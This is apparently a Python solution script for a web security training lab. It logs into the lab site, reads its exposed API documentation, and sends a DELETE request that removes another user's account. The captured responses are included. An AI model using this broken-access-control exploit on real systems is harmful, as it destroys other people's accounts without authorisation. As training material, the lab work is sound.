# LAB: Exploiting an API endpoint using documentation

import re
import requests

URL = "https://0a11005904655062800b8adf003000eb.web-security-academy.net"
s = requests.Session()

print("===========[step1] login as wiener===============")
r = s.get(f"{URL}/login")
csrf = re.search(r'name="csrf" value="([^"]+)"', r.text).group(1)
r = s.post(f"{URL}/login", data={"csrf": csrf, "username": "wiener", "password": "peter"})
print("[login]", r.status_code, r.url)

print("===========[step2] find API docs (/api -> /api/)===============")
r = s.get(f"{URL}/api/")
print("[docs]", r.status_code, "DELETE" in r.text)
'''
<tr>
    <td>DELETE</td>
    <td>/user/[username]</td>
    <td></td>
    <td><span class='http-response'>200 OK</span>, <a href='doc/Result'>Result</a></td>
</tr>
'''

print("===========[step3] DELETE carlos via documented endpoint===============")
r = s.delete(f"{URL}/api/user/carlos")
print("[delete]", r.status_code, r.text)
'''
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 25

{"status":"User deleted"}
'''